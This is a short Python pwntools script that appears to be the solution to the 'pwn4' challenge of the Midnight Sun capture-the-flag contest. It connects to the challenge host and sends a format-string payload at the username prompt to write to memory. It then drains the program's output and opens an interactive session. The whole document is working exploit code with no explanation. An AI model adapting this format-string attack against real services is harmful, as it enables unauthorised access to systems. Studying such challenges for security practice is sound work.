#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./pwn4')

host = args.HOST or 'pwn4-01.play.midnightsunctf.se'
port = int(args.PORT or 10004)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

io = start()

io.recvuntil("user: ")
io.sendline("%*25$x%16$n")

io.recvuntil("code: ")
io.sendline(str(10))

io.recvuntil("logged: ")

p = log.progress("Receiving data")

total = 0
while 1:
    try:
        data = io.recv(1024 * 1024)
        total += len(data)
        p.status("%d MB", total / 1e6)
    except:
        break

io.interactive()

